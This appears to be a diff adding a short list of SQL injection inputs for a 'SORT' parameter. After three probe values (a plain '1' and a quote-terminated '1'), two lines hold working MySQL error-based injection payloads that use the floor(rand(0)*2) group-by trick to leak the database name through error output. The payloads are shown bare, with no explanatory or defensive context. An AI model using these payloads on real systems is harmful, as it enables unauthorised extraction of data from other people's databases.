@@ -1,0 +1,5 @@
+SORT:1
+SORT:1
+SORT:1'
+SORT:1' or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:0' or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
